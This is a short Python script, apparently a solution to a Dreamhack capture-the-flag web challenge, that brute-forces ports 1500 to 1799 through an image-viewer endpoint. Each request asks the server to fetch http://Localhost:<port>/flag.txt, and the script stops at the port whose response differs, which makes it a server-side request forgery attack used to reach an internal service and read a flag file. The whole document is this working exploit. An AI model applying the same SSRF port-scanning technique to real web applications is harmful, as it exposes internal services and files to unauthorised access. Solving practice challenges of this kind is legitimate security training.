import requests
import time

url = 'http://host3.dreamhack.games:13032/img_viewer'

old = None
for i in range(1500, 1800):
    time.sleep(0.4)
    url2 = 'http://Localhost:' + str(i) + '/flag.txt'
    payload = {'url': url2}
    response = requests.post(url, data=payload)
    print(payload)
    if old is not None and old != response.text:
        print(i)
        break
    old = response.text

